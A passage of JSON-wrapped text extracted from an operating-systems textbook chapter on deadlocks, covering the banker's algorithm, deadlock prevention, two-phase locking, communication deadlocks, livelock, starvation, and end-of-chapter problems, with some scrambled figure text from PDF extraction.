            "content": "6.5.3 The Banker’s Algorithm for a Single Resource\r\nA scheduling algorithm that can avoid deadlocks is due to Dijkstra (1965); it is\r\nknown as the banker’s algorithm and is an extension of the deadlock detection al\u0002gorithm given in Sec. 3.4.1. It is modeled on the way a small-town banker might\r\ndeal with a group of customers to whom he has granted lines of credit. (Years ago,\r\nbanks did not lend money unless they knew they could be repaid.) What the algo\u0002rithm does is check to see if granting the request leads to an unsafe state. If so, the\r\nrequest is denied. If granting the request leads to a safe state, it is carried out. In\r\nFig. 6-11(a) we see four customers, A, B, C, and D, each of whom has been granted\r\na certain number of credit units (e.g., 1 unit is 1K dollars). The banker knows that\r\nnot all customers will need their maximum credit immediately, so he has reserved\r\nonly 10 units rather than 22 to service them. (In this analogy, customers are proc\u0002esses, units are, say, tape drives, and the banker is the operating system.)\r\nThe customers go about their respective businesses, making loan requests from\r\ntime to time (i.e., asking for resources). At a certain moment, the situation is as\r\nshown in Fig. 6-11(b). This state is safe because with two units left, the banker can\r\ndelay any requests except C’s, thus letting C finish and release all four of his re\u0002sources. With four units in hand, the banker can let either D or B have the neces\u0002sary units, and so on.\r\nConsider what would happen if a request from B for one more unit were grant\u0002ed in Fig. 6-11(b). We would have situation Fig. 6-11(c), which is unsafe. If all\n454 DEADLOCKS CHAP. 6\r\nA\r\nB\r\nC\r\nD\r\n0\r\n0\r\n0\r\n0\r\n6\r\nHas Max\r\n5\r\n4\r\n7\r\nFree: 10\r\nA\r\nB\r\nC\r\nD\r\n1\r\n1\r\n2\r\n4\r\n6\r\nHas Max\r\n5\r\n4\r\n7\r\nFree: 2\r\nA\r\nB\r\nC\r\nD\r\n1\r\n2\r\n2\r\n4\r\n6\r\nHas Max\r\n5\r\n4\r\n7\r\nFree: 1\r\n(a) (b) (c)\r\nFigure 6-11. Three resource allocation states: (a) Safe. (b) Safe. (c) Unsafe.\r\nthe customers suddenly asked for their maximum loans, the banker could not sat\u0002isfy any of them, and we would have a deadlock. An unsafe state does not have to\r\nlead to deadlock, since a customer might not need the entire credit line available,\r\nbut the banker cannot count on this behavior.\r\nThe banker’s algorithm considers each request as it occurs, seeing whether\r\ngranting it leads to a safe state. If it does, the request is granted; otherwise, it is\r\npostponed until later. To see if a state is safe, the banker checks to see if he has\r\nenough resources to satisfy some customer. If so, those loans are assumed to be\r\nrepaid, and the customer now closest to the limit is checked, and so on. If all loans\r\ncan eventually be repaid, the state is safe and the initial request can be granted."
          },
          "6.5.4 The Banker’s Algorithm for Multiple Resources": {
            "page": 485,
            "content": "6.5.4 The Banker’s Algorithm for Multiple Resources\r\nThe banker’s algorithm can be generalized to handle multiple resources. Fig\u0002ure 6-12 shows how it works.\r\nProcess\r\nTape drives\r\nPlottersPrinters\r\nBlu-rays\r\nProcess\r\nTape drives\r\nPlotters\r\nPrinters\r\nBlu-rays\r\nA 3 0 1 1\r\nB 0 1 0 0\r\nC 1 1 1 0\r\nD 1 1 0 1\r\nE 0 0\r\nResources assigned\r\n0 0\r\nA 1 1 0 0\r\nB 0 1 1 2\r\nC 3 1 0 0\r\nD 0 0 1 0\r\nE 2 1\r\nResources still assigned\r\n1 0\r\nE = (6342)\r\nP = (5322)\r\nA = (1020)\r\nFigure 6-12. The banker’s algorithm with multiple resources.\r\nIn Fig. 6-12 we see two matrices. The one on the left shows how many of each\r\nresource are currently assigned to each of the fiv e processes. The matrix on the\r\nright shows how many resources each process still needs in order to complete.\nSEC. 6.5 DEADLOCK AVOIDANCE 455\r\nThese matrices are just C and R from Fig. 6-6. As in the single-resource case,\r\nprocesses must state their total resource needs before executing, so that the system\r\ncan compute the right-hand matrix at each instant.\r\nThe three vectors at the right of the figure show the existing resources, E, the\r\npossessed resources, P, and the available resources, A, respectively. From E we\r\nsee that the system has six tape drives, three plotters, four printers, and two Blu-ray\r\ndrives. Of these, fiv e tape drives, three plotters, two printers, and two Blu-ray\r\ndrives are currently assigned. This fact can be seen by adding up the entries in the\r\nfour resource columns in the left-hand matrix. The available resource vector is just\r\nthe difference between what the system has and what is currently in use.\r\nThe algorithm for checking to see if a state is safe can now be stated.\r\n1. Look for a row, R, whose unmet resource needs are all smaller than or\r\nequal to A. If no such row exists, the system will eventually deadlock\r\nsince no process can run to completion (assuming processes keep all\r\nresources until they exit).\r\n2. Assume the process of the chosen row requests all the resources it\r\nneeds (which is guaranteed to be possible) and finishes. Mark that\r\nprocess as terminated and add all of its resources to the A vector.\r\n3. Repeat steps 1 and 2 until either all processes are marked terminated\r\n(in which case the initial state was safe) or no process is left whose\r\nresource needs can be met (in which case the system was not safe).\r\nIf several processes are eligible to be chosen in step 1, it does not matter which one\r\nis selected: the pool of available resources either gets larger, or at worst, stays the\r\nsame.\r\nNow let us get back to the example of Fig. 6-12. The current state is safe.\r\nSuppose that process B now makes a request for the printer. This request can be\r\ngranted because the resulting state is still safe (process D can finish, and then proc\u0002esses A or E, followed by the rest).\r\nNow imagine that after giving B one of the two remaining printers, E wants the\r\nlast printer. Granting that request would reduce the vector of available resources to\r\n(1 0 0 0), which leads to deadlock, so E’s request must be deferred for a while.\r\nThe banker’s algorithm was first published by Dijkstra in 1965. Since that\r\ntime, nearly every book on operating systems has described it in detail. Innumer\u0002able papers have been written about various aspects of it. Unfortunately, few\r\nauthors have had the audacity to point out that although in theory the algorithm is\r\nwonderful, in practice it is essentially useless because processes rarely know in ad\u0002vance what their maximum resource needs will be. In addition, the number of\r\nprocesses is not fixed, but dynamically varying as new users log in and out. Fur\u0002thermore, resources that were thought to be available can suddenly vanish (tape\r\ndrives can break). Thus, in practice, few, if any, existing systems use the banker’s\r\nalgorithm for avoiding deadlocks. Some systems, however, use heuristics similar to\n456 DEADLOCKS CHAP. 6\r\nthose of the banker’s algorithm to prevent deadlock. For instance, networks may\r\nthrottle traffic when buffer utilization reaches higher than, say, 70%—estimating\r\nthat the remaining 30% will be sufficient for current users to complete their service\r\nand return their resources."
          }
        }
      },
      "6.6 DEADLOCK PREVENTION": {
        "page": 487,
        "children": {
          "6.6.1 Attacking the Mutual-Exclusion Condition": {
            "page": 487,
            "content": "6.6.1 Attacking the Mutual-Exclusion Condition\r\nFirst let us attack the mutual exclusion condition. If no resource were ever as\u0002signed exclusively to a single process, we would never hav e deadlocks. For data,\r\nthe simplest method is to make data read only, so that processes can use the data\r\nconcurrently. Howev er, it is equally clear that allowing two processes to write on\r\nthe printer at the same time will lead to chaos. By spooling printer output, several\r\nprocesses can generate output at the same time. In this model, the only process\r\nthat actually requests the physical printer is the printer daemon. Since the daemon\r\nnever requests any other resources, we can eliminate deadlock for the printer.\r\nIf the daemon is programmed to begin printing even before all the output is\r\nspooled, the printer might lie idle if an output process decides to wait several hours\r\nafter the first burst of output. For this reason, daemons are normally programmed\r\nto print only after the complete output file is available. However, this decision it\u0002self could lead to deadlock. What would happen if two processes each filled up\r\none half of the available spooling space with output and neither was finished pro\u0002ducing its full output? In this case, we would have two processes that had each fin\u0002ished part, but not all, of their output, and could not continue. Neither process will\r\nev er finish, so we would have a deadlock on the disk.\r\nNevertheless, there is a germ of an idea here that is frequently applicable.\r\nAv oid assigning a resource unless absolutely necessary, and try to make sure that\r\nas few processes as possible may actually claim the resource."
          },
          "6.6.2 Attacking the Hold-and-Wait Condition": {
            "page": 487,
            "content": "6.6.2 Attacking the Hold-and-Wait Condition\r\nThe second of the conditions stated by Coffman et al. looks slightly more\r\npromising. If we can prevent processes that hold resources from waiting for more\r\nresources, we can eliminate deadlocks. One way to achieve this goal is to require\nSEC. 6.6 DEADLOCK PREVENTION 457\r\nall processes to request all their resources before starting execution. If ev erything\r\nis available, the process will be allocated whatever it needs and can run to comple\u0002tion. If one or more resources are busy, nothing will be allocated and the process\r\nwill just wait.\r\nAn immediate problem with this approach is that many processes do not know\r\nhow many resources they will need until they hav e started running. In fact, if they\r\nknew, the banker’s algorithm could be used. Another problem is that resources\r\nwill not be used optimally with this approach. Take, as an example, a process that\r\nreads data from an input tape, analyzes it for an hour, and then writes an output\r\ntape as well as plotting the results. If all resources must be requested in advance,\r\nthe process will tie up the output tape drive and the plotter for an hour.\r\nNevertheless, some mainframe batch systems require the user to list all the re\u0002sources on the first line of each job. The system then preallocates all resources im\u0002mediately and does not release them until they are no longer needed by the job (or\r\nin the simplest case, until the job finishes). While this method puts a burden on the\r\nprogrammer and wastes resources, it does prevent deadlocks.\r\nA slightly different way to break the hold-and-wait condition is to require a\r\nprocess requesting a resource to first temporarily release all the resources it cur\u0002rently holds. Then it tries to get everything it needs all at once."
          },
          "6.6.3 Attacking the No-Preemption Condition": {
            "page": 488,
            "content": "6.6.3 Attacking the No-Preemption Condition\r\nAttacking the third condition (no preemption) is also a possibility. If a process\r\nhas been assigned the printer and is in the middle of printing its output, forcibly\r\ntaking away the printer because a needed plotter is not available is tricky at best\r\nand impossible at worst. However, some resources can be virtualized to avoid this\r\nsituation. Spooling printer output to the disk and allowing only the printer daemon\r\naccess to the real printer eliminates deadlocks involving the printer, although it cre\u0002ates a potential for deadlock over disk space. With large disks though, running out\r\nof disk space is unlikely.\r\nHowever, not all resources can be virtualized like this. For example, records in\r\ndatabases or tables inside the operating system must be locked to be used and\r\ntherein lies the potential for deadlock."
          },
          "6.6.4 Attacking the Circular Wait Condition": {
            "page": 488,
            "content": "6.6.4 Attacking the Circular Wait Condition\r\nOnly one condition is left. The circular wait can be eliminated in several ways.\r\nOne way is simply to have a rule saying that a process is entitled only to a single\r\nresource at any moment. If it needs a second one, it must release the first one. For\r\na process that needs to copy a huge file from a tape to a printer, this restriction is\r\nunacceptable.\r\nAnother way to avoid the circular wait is to provide a global numbering of all\r\nthe resources, as shown in Fig. 6-13(a). Now the rule is this: processes can request\n458 DEADLOCKS CHAP. 6\r\nresources whenever they want to, but all requests must be made in numerical order.\r\nA process may request first a printer and then a tape drive, but it may not request\r\nfirst a plotter and then a printer.\r\n(a) (b)\r\n1. Imagesetter\r\n2. Printer\r\n3. Plotter\r\n4. Tape drive\r\n5. Blu-ray drive\r\nA\r\ni\r\nB\r\nj\r\nFigure 6-13. (a) Numerically ordered resources. (b) A resource graph.\r\nWith this rule, the resource allocation graph can never hav e cycles. Let us see\r\nwhy this is true for the case of two processes, in Fig. 6-13(b). We can get a dead\u0002lock only if A requests resource j and B requests resource i. Assuming i and j are\r\ndistinct resources, they will have different numbers. If i > j, then A is not allowed\r\nto request j because that is lower than what it already has. If i < j, then B is not al\u0002lowed to request i because that is lower than what it already has. Either way, dead\u0002lock is impossible.\r\nWith more than two processes, the same logic holds. At every instant, one of\r\nthe assigned resources will be highest. The process holding that resource will\r\nnever ask for a resource already assigned. It will either finish, or at worst, request\r\nev en higher-numbered resources, all of which are available. Eventually, it will fin\u0002ish and free its resources. At this point, some other process will hold the highest\r\nresource and can also finish. In short, there exists a scenario in which all processes\r\nfinish, so no deadlock is present.\r\nA minor variation of this algorithm is to drop the requirement that resources be\r\nacquired in strictly increasing sequence and merely insist that no process request a\r\nresource lower than what it is already holding. If a process initially requests 9 and\r\n10, and then releases both of them, it is effectively starting all over, so there is no\r\nreason to prohibit it from now requesting resource 1.\r\nAlthough numerically ordering the resources eliminates the problem of dead\u0002locks, it may be impossible to find an ordering that satisfies everyone. When the\r\nresources include process-table slots, disk spooler space, locked database records,\r\nand other abstract resources, the number of potential resources and different uses\r\nmay be so large that no ordering could possibly work.\r\nVarious approaches to deadlock prevention are summarized in Fig. 6-14."
          }
        }
      },
      "6.7 OTHER ISSUES": {
        "page": 489,
        "children": {
          "6.7.1 Two-Phase Locking": {
            "page": 490,
            "content": "6.7.1 Two-Phase Locking\r\nAlthough both avoidance and prevention are not terribly promising in the gen\u0002eral case, for specific applications, many excellent special-purpose algorithms are\r\nknown. As an example, in many database systems, an operation that occurs fre\u0002quently is requesting locks on several records and then updating all the locked\r\nrecords. When multiple processes are running at the same time, there is a real dan\u0002ger of deadlock.\r\nThe approach often used is called two-phase locking. In the first phase, the\r\nprocess tries to lock all the records it needs, one at a time. If it succeeds, it begins\r\nthe second phase, performing its updates and releasing the locks. No real work is\r\ndone in the first phase.\r\nIf during the first phase, some record is needed that is already locked, the proc\u0002ess just releases all its locks and starts the first phase all over. In a certain sense,\r\nthis approach is similar to requesting all the resources needed in advance, or at\r\nleast before anything irreversible is done. In some versions of two-phase locking,\r\nthere is no release and restart if a locked record is encountered during the first\r\nphase. In these versions, deadlock can occur.\r\nHowever, this strategy is not applicable in general. In real-time systems and\r\nprocess control systems, for example, it is not acceptable to just terminate a proc\u0002ess partway through because a resource is not available and start all over again.\r\nNeither is it acceptable to start over if the process has read or written messages to\r\nthe network, updated files, or anything else that cannot be safely repeated. The al\u0002gorithm works only in those situations where the programmer has very carefully\r\narranged things so that the program can be stopped at any point during the first\r\nphase and restarted. Many applications cannot be structured this way."
          },
          "6.7.2 Communication Deadlocks": {
            "page": 490,
            "content": "6.7.2 Communication Deadlocks\r\nAll of our work so far has concentrated on resource deadlocks. One process\r\nwants something that another process has and must wait until the first one gives it\r\nup. Sometimes the resources are hardware or software objects, such as Blu-ray\r\ndrives or database records, but sometimes they are more abstract. Resource dead\u0002lock is a problem of competition synchronization. Independent processes would\n460 DEADLOCKS CHAP. 6\r\ncomplete service if their execution were not interleaved with competing processes.\r\nA process locks resources in order to prevent inconsistent resource states caused by\r\ninterleaved access to resources. Interleaved access to locked resources, however,\r\nenables resource deadlock. In Fig. 6-2 we saw a resource deadlock where the re\u0002sources were semaphores. A semaphore is a bit more abstract than a Blu-ray drive,\r\nbut in this example, each process successfully acquired a resource (one of the\r\nsemaphores) and deadlocked trying to acquire another one (the other semaphore).\r\nThis situation is a classical resource deadlock.\r\nHowever, as we mentioned at the start of the chapter, while resource deadlocks\r\nare the most common kind, they are not the only kind. Another kind of deadlock\r\ncan occur in communication systems (e.g., networks), in which two or more proc\u0002esses communicate by sending messages. A common arrangement is that process\r\nA sends a request message to process B, and then blocks until B sends back a reply\r\nmessage. Suppose that the request message gets lost. A is blocked waiting for the\r\nreply. B is blocked waiting for a request asking it to do something. We hav e a\r\ndeadlock.\r\nThis, though, is not the classical resource deadlock. A does not have posses\u0002sion of some resource B wants, and vice versa. In fact, there are no resources at all\r\nin sight. But it is a deadlock according to our formal definition since we have a set\r\nof (two) processes, each blocked waiting for an event only the other one can cause.\r\nThis situation is called a communication deadlock to contrast it with the more\r\ncommon resource deadlock. Communication deadlock is an anomaly of coopera\u0002tion synchronization. The processes in this type of deadlock could not complete\r\nservice if executed independently.\r\nCommunication deadlocks cannot be prevented by ordering the resources\r\n(since there are no resources) or avoided by careful scheduling (since there are no\r\nmoments when a request could be postponed). Fortunately, there is another techni\u0002que that can usually be employed to break communication deadlocks: timeouts. In\r\nmost network communication systems, whenever a message is sent to which a re\u0002ply is expected, a timer is started. If the timer goes off before the reply arrives, the\r\nsender of the message assumes that the message has been lost and sends it again\r\n(and again and again if needed). In this way, the deadlock is broken. Phrased dif\u0002ferently, the timeout serves as a heuristic to detect deadlocks and enables recovery.\r\nThis heuristic is applicable to resource deadlock also and is relied upon by users\r\nwith temperamental or buggy device drivers that can deadlock and freeze the sys\u0002tem.\r\nOf course, if the original message was not lost but the reply was simply delay\u0002ed, the intended recipient may get the message two or more times, possibly with\r\nundesirable consequences. Think about an electronic banking system in which the\r\nmessage contains instructions to make a payment. Clearly, that should not be re\u0002peated (and executed) multiple times just because the network is slow or the time\u0002out too short. Designing the communication rules, called the protocol, to get\r\nev erything right is a complex subject, but one far beyond the scope of this book.\nSEC. 6.7 OTHER ISSUES 461\r\nReaders interested in network protocols might be interested in another book by one\r\nof the authors, Computer Networks (Tanenbaum and Wetherall, 2010).\r\nNot all deadlocks occurring in communication systems or networks are com\u0002munication deadlocks. Resource deadlocks can also occur there. Consider, for ex\u0002ample, the network of Fig. 6-15. It is a simplified view of the Internet. Very sim\u0002plified. The Internet consists of two kinds of computers: hosts and routers. A host\r\nis a user computer, either someone’s tablet or PC at home, a PC at a company, or a\r\ncorporate server. Hosts do work for people. A router is a specialized communica\u0002tions computer that moves packets of data from the source to the destination. Each\r\nhost is connected to one or more routers, either by a DSL line, cable TV con\u0002nection, LAN, dial-up line, wireless network, optical fiber, or something else.\r\nA B\r\nD C\r\nHost\r\nHost\r\nHost\r\nHost\r\nBuffer Router\r\nFigure 6-15. A resource deadlock in a network.\r\nWhen a packet comes into a router from one of its hosts, it is put into a buffer\r\nfor subsequent transmission to another router and then to another until it gets to the\r\ndestination. These buffers are resources and there are a finite number of them. In\r\nFig. 6-16 each router has only eight buffers (in practice they hav e millions, but that\r\ndoes not change the nature of the potential deadlock, just its frequency). Suppose\r\nthat all the packets at router A need to go to B and all the packets at B need to go to\r\nC and all the packets at C need to go to D and all the packets at D need to go to A.\r\nNo packet can move because there is no buffer at the other end and we have a clas\u0002sical resource deadlock, albeit in the middle of a communications system."
          },
          "6.7.3 Livelock": {
            "page": 492,
            "content": "6.7.3 Livelock\r\nIn some situations, a process tries to be polite by giving up the locks it already\r\nacquired whenever it notices that it cannot obtain the next lock it needs. Then it\r\nwaits a millisecond, say, and tries again. In principle, this is good and should help\r\nto detect and avoid deadlock. However, if the other process does the same thing at\r\nexactly the same time, they will be in the situation of two people trying to pass\r\neach other on the street when both of them politely step aside, and yet no progress\r\nis possible, because they keep stepping the same way at the same time.\n462 DEADLOCKS CHAP. 6\r\nConsider an atomic primitive try lock in which the calling process tests a\r\nmutex and either grabs it or returns failure. In other words, it never blocks. Pro\u0002grammers can use it together with acquire lock which also tries to grab the lock,\r\nbut blocks if the lock is not available. Now imagine a pair of processes running in\r\nparallel (perhaps on different cores) that use two resources, as shown in Fig. 6-16.\r\nEach one needs two resources and uses the try lock primitive to try to acquire the\r\nnecessary locks. If the attempt fails, the process gives up the lock it holds and tries\r\nagain. In Fig. 6-16, process A runs and acquires resource 1, while process 2 runs\r\nand acquires resource 2. Next, they try to acquire the other lock and fail. To be\r\npolite, they giv e up the lock they are currently holding and try again. This proce\u0002dure repeats until a bored user (or some other entity) puts one of these processes\r\nout of its misery. Clearly, no process is blocked and we could even say that things\r\nare happening, so this is not a deadlock. Still, no progress is possible, so we do\r\nhave something equivalent: a livelock.\r\nvoid process A(void) {\r\nacquire lock(&resource 1);\r\nwhile (try lock(&resource 2) == FAIL) {\r\nrelease lock(&resource 1);\r\nwait fixed time();\r\nacquire lock(&resource 1);\r\n}\r\nuse both resources( );\r\nrelease lock(&resource 2);\r\nrelease lock(&resource 1);\r\n}\r\nvoid process A(void) {\r\nacquire lock(&resource 2);\r\nwhile (try lock(&resource 1) == FAIL) {\r\nrelease lock(&resource 2);\r\nwait fixed time();\r\nacquire lock(&resource 2);\r\n}\r\nuse both resources( );\r\nrelease lock(&resource 1);\r\nrelease lock(&resource 2);\r\n}\r\nFigure 6-16. Polite processes that may cause livelock.\r\nLivelock and deadlock can occur in surprising ways. In some systems, the\r\ntotal number of processes allowed is determined by the number of entries in the\r\nprocess table. Thus, process-table slots are finite resources. If a fork fails because\r\nthe table is full, a reasonable approach for the program doing the fork is to wait a\r\nrandom time and try again.\nSEC. 6.7 OTHER ISSUES 463\r\nNow suppose that a UNIX system has 100 process slots. Ten programs are\r\nrunning, each of which needs to create 12 children. After each process has created\r\n9 processes, the 10 original processes and the 90 new processes have exhausted the\r\ntable. Each of the 10 original processes now sits in an endless loop forking and\r\nfailing—a livelock. The probability of this happening is minuscule, but it could\r\nhappen. Should we abandon processes and the fork call to eliminate the problem?\r\nThe maximum number of open files is similarly restricted by the size of the i\u0002node table, so a similar problem occurs when it fills up. Swap space on the disk is\r\nanother limited resource. In fact, almost every table in the operating system\r\nrepresents a finite resource. Should we abolish all of these because it might hap\u0002pen that a collection of n processes might each claim 1/n of the total, and then each\r\ntry to claim another one? Probably not a good idea.\r\nMost operating systems, including UNIX and Windows, basically just ignore\r\nthe problem on the assumption that most users would prefer an occasional livelock\r\n(or even deadlock) to a rule restricting all users to one process, one open file, and\r\none of everything. If these problems could be eliminated for free, there would not\r\nbe much discussion. The problem is that the price is high, mostly in terms of put\u0002ting inconvenient restrictions on processes. Thus, we are faced with an unpleasant\r\ntrade-off between convenience and correctness, and a great deal of discussion\r\nabout which is more important, and to whom."
          },
          "6.7.4 Starvation": {
            "page": 494,
            "content": "6.7.4 Starvation\r\nA problem closely related to deadlock and livelock is starvation. In a dynam\u0002ic system, requests for resources happen all the time. Some policy is needed to\r\nmake a decision about who gets which resource when. This policy, although seem\u0002ingly reasonable, may lead to some processes never getting service even though\r\nthey are not deadlocked.\r\nAs an example, consider allocation of the printer. Imagine that the system uses\r\nsome algorithm to ensure that allocating the printer does not lead to deadlock.\r\nNow suppose that several processes all want it at once. Who should get it?\r\nOne possible allocation algorithm is to give it to the process with the smallest\r\nfile to print (assuming this information is available). This approach maximizes the\r\nnumber of happy customers and seems fair. Now consider what happens in a busy\r\nsystem when one process has a huge file to print. Every time the printer is free, the\r\nsystem will look around and choose the process with the shortest file. If there is a\r\nconstant stream of processes with short files, the process with the huge file will\r\nnever be allocated the printer. It will simply starve to death (be postponed indefi\u0002nitely, even though it is not blocked).\r\nStarvation can be avoided by using a first-come, first-served resource alloca\u0002tion policy. With this approach, the process waiting the longest gets served next.\r\nIn due course of time, any giv en process will eventually become the oldest and thus\r\nget the needed resource.\n464 DEADLOCKS CHAP. 6\r\nIt is worth mentioning that some people do not make a distinction between\r\nstarvation and deadlock because in both cases there is no forward progress. Others\r\nfeel that they are fundamentally different because a process could easily be pro\u0002grammed to try to do something n times and, if all of them failed, try something\r\nelse. A blocked process does not have that choice."
          }
        }
      },
      "6.8 RESEARCH ON DEADLOCKS": {
        "page": 495,
        "content": "6.8 RESEARCH ON DEADLOCKS\r\nIf ever there was a subject that was investigated mercilessly during the early\r\ndays of operating systems, it was deadlocks. The reason is that deadlock detection\r\nis a nice little graph-theory problem that one mathematically inclined graduate stu\u0002dent could get his jaws around and chew on for 4 years. Many algorithms were de\u0002vised, each one more exotic and less practical than the previous one. Most of that\r\nwork has died out. Still, a few papers are still being published on deadlocks.\r\nRecent work on deadlocks includes the research into deadlock immunity (Jula\r\net al., 2011). The main idea of this approach is that applications detect deadlocks\r\nwhen they occur and then save their ‘‘signatures,’’ so as to avoid the same deadlock\r\nin future runs. Marino et al. (2013), on the other hand, use concurrency control to\r\nmake sure that deadlocks cannot occur in the first place.\r\nAnother research direction is to try and detect deadlocks. Recent work on\r\ndeadlock detection was presented by Pyla and Varadarajan (2012). The work by\r\nCai and Chan (2012), presents a new dynamic deadlock detection scheme that iter\u0002atively prunes lock dependencies that have no incoming or outgoing edges.\r\nThe problem of deadlock creeps up everywhere. Wu et al. (2013) describe a\r\ndeadlock control system for automated manufacturing systems. It models such sys\u0002tems using Petri nets to look for necessary and sufficient conditions to allow for\r\npermissive deadlock control.\r\nThere is also much research on distributed deadlock detection, especially in\r\nhigh-performance computing. For instance, there is a significant body of work on\r\ndeadlock detection-based scheduling. Wang and Lu (2013) present a scheduling al\u0002gorithm for workflow computations in the presence of storage constraints. Hilbrich\r\net al. (2013) describe runtime deadlock detection for MPI. Finally, there is a huge\r\namount of theoretical work on distributed deadlock detection. However, we will\r\nnot consider it here because (1) it is outside the scope of this book, and (2) none of\r\nit is even remotely practical in real systems. Its main function seems to be keeping\r\notherwise unemployed graph theorists off the streets."
      },
      "6.9 SUMMARY": {
        "page": 495,
        "content": "6.9 SUMMARY\r\nDeadlock is a potential problem in any operating system. It occurs when all\r\nthe members of a set of processes are blocked waiting for an event that only other\r\nmembers of the same set can cause. This situation causes all the processes to wait\nSEC. 6.9 SUMMARY 465\r\nforever. Commonly the event that the processes are waiting for is the release of\r\nsome resource held by another member of the set. Another situation in which\r\ndeadlock is possible is when a set of communicating processes are all waiting for a\r\nmessage and the communication channel is empty and no timeouts are pending.\r\nResource deadlock can be avoided by keeping track of which states are safe\r\nand which are unsafe. A safe state is one in which there exists a sequence of\r\nev ents that guarantee that all processes can finish. An unsafe state has no such\r\nguarantee. The banker’s algorithm avoids deadlock by not granting a request if\r\nthat request will put the system in an unsafe state.\r\nResource deadlock can be structurally prevented by building the system in\r\nsuch a way that it can never occur by design. For example, by allowing a process\r\nto hold only one resource at any instant the circular wait condition required for\r\ndeadlock is broken. Resource deadlock can also be prevented by numbering all the\r\nresources and making processes request them in strictly increasing order.\r\nResource deadlock is not the only kind of deadlock. Communication deadlock\r\nis also a potential problem in some systems although it can often be handled by\r\nsetting appropriate timeouts.\r\nLivelock is similar to deadlock in that it can stop all forward progress, but it is\r\ntechnically different since it involves processes that are not actually blocked. Star\u0002vation can be avoided by a first-come, first-served allocation policy.\r\nPROBLEMS\r\n1. Give an example of a deadlock taken from politics.\r\n2. Students working at individual PCs in a computer laboratory send their files to be\r\nprinted by a server that spools the files on its hard disk. Under what conditions may a\r\ndeadlock occur if the disk space for the print spool is limited? How may the deadlock\r\nbe avoided?\r\n3. In the preceding question, which resources are preemptable and which are nonpre\u0002emptable?\r\n4. In Fig. 6-1 the resources are returned in the reverse order of their acquisition. Would\r\ngiving them back in the other order be just as good?\r\n5. The four conditions (mutual exclusion, hold and wait, no preemption and circular wait)\r\nare necessary for a resource deadlock to occur. Giv e an example to show that these\r\nconditions are not sufficient for a resource deadlock to occur. When are these condi\u0002tions sufficient for a resource deadock to occur?\r\n6. City streets are vulnerable to a circular blocking condition called gridlock, in which\r\nintersections are blocked by cars that then block cars behind them that then block the\r\ncars that are trying to enter the previous intersection, etc. All intersections around a\r\ncity block are filled with vehicles that block the oncoming traffic in a circular manner.\n466 DEADLOCKS CHAP. 6\r\nGridlock is a resource deadlock and a problem in competition synchronization. New\r\nYork City’s prevention algorithm, called \"don’t block the box,\" prohibits cars from\r\nentering an intersection unless the space following the intersection is also available.\r\nWhich prevention algorithm is this? Can you provide any other prevention algorithms\r\nfor gridlock?\r\n7. Suppose four cars each approach an intersection from four different directions simul\u0002taneously. Each corner of the intersection has a stop sign. Assume that traffic regula\u0002tions require that when two cars approach adjacent stop signs at the same time, the car\r\non the left must yield to the car on the right. Thus, as four cars each drive up to their\r\nindividual stop signs, each waits (indefinitely) for the car on the left to proceed. Is this\r\nanomaly a communication deadlock? Is it a resource deadlock?\r\n8. Is it possible that a resource deadlock involves multiple units of one type and a single\r\nunit of another? If so, give an example.\r\n9. Fig. 6-3 shows the concept of a resource graph. Do illegal graphs exist, that is, graphs\r\nthat structurally violate the model we have used of resource usage? If so, give an ex\u0002ample of one.\r\n10. Consider Fig. 6-4. Suppose that in step (o) C requested S instead of requesting R.\r\nWould this lead to deadlock? Suppose that it requested both S and R.\r\n11. Suppose that there is a resource deadlock in a system. Give an example to show that\r\nthe set of processes deadlocked can include processes that are not in the circular chain\r\nin the corresponding resource allocation graph.\r\n12. In order to control traffic, a network router, A periodically sends a message to its\r\nneighbor, B, telling it to increase or decrease the number of packets that it can handle.\r\nAt some point in time, Router A is flooded with traffic and sends B a message telling it\r\nto cease sending traffic. It does this by specifying that the number of bytes B may send\r\n(A’s window size) is 0. As traffic surges decrease, A sends a new message, telling B to\r\nrestart transmission. It does this by increasing the window size from 0 to a positive\r\nnumber. That message is lost. As described, neither side will ever transmit. What type\r\nof deadlock is this?\r\n13. The discussion of the ostrich algorithm mentions the possibility of process-table slots\r\nor other system tables filling up. Can you suggest a way to enable a system administra\u0002tor to recover from such a situation?\r\n14. Consider the following state of a system with four processes, P1, P2, P3, and P4, and\r\nfive types of resources, RS1, RS2, RS3, RS4, and RS5:\r\n0\r\n0\r\n0\r\n2\r\n1\r\n0\r\n0\r\n0\r\n1\r\n1\r\n0\r\n0\r\nE = (24144)\r\nA = (01021)\r\nC = R =\r\n1 2\r\n1 0\r\n0 1\r\n1 0\r\n1 1 0 2 1\r\n0 1 0 2 1\r\n0 2 0 3 1\r\n0 2 1 1 0\r\nUsing the deadlock detection algorithm described in Section 6.4.2, show that there is a\r\ndeadlock in the system. Identify the processes that are deadlocked.\nCHAP. 6 PROBLEMS 467\r\n15. Explain how the system can recover from the deadlock in previous problem using\r\n(a) recovery through preemption.\r\n(b) recovery through rollback.\r\n(c) recovery through killing processes.\r\n16. Suppose that in Fig. 6-6 Cij + Rij > E j for some i. What implications does this have\r\nfor the system?\r\n17. All the trajectories in Fig. 6-8 are horizontal or vertical. Can you envision any circum\u0002stances in which diagonal trajectories are also possible?\r\n18. Can the resource trajectory scheme of Fig. 6-8 also be used to illustrate the problem of\r\ndeadlocks with three processes and three resources? If so, how can this be done? If\r\nnot, why not?\r\n19. In theory, resource trajectory graphs could be used to avoid deadlocks. By clever\r\nscheduling, the operating system could avoid unsafe regions. Is there a practical way\r\nof actually doing this?\r\n20. Can a system be in a state that is neither deadlocked nor safe? If so, give an example.\r\nIf not, prove that all states are either deadlocked or safe.\r\n21. Take a careful look at Fig. 6-11(b). If D asks for one more unit, does this lead to a safe\r\nstate or an unsafe one? What if the request came from C instead of D?\r\n22. A system has two processes and three identical resources. Each process needs a maxi\u0002mum of two resources. Is deadlock possible? Explain your answer.\r\n23. Consider the previous problem again, but now with p processes each needing a maxi\u0002mum of m resources and a total of r resources available. What condition must hold to\r\nmake the system deadlock free?\r\n24. Suppose that process A in Fig. 6-12 requests the last tape drive. Does this action lead\r\nto a deadlock?\r\n25. The banker’s algorithm is being run in a system with m resource classes and n proc\u0002esses. In the limit of large m and n, the number of operations that must be performed\r\nto check a state for safety is proportional to ma nb\r\n. What are the values of a and b?\r\n26. A system has four processes and fiv e allocatable resources. The current allocation and\r\nmaximum needs are as follows:\r\nAllocated Maximum Available\r\nProcess A 1 0 2 1 1 1 1 2 1 3 0 0 x 1 1\r\nProcess B 2 0 1 1 0 2 2 2 1 0\r\nProcess C 1 1 0 1 0 2 1 3 1 0\r\nProcess D 1 1 1 1 0 1 1 2 2 1\r\nWhat is the smallest value of x for which this is a safe 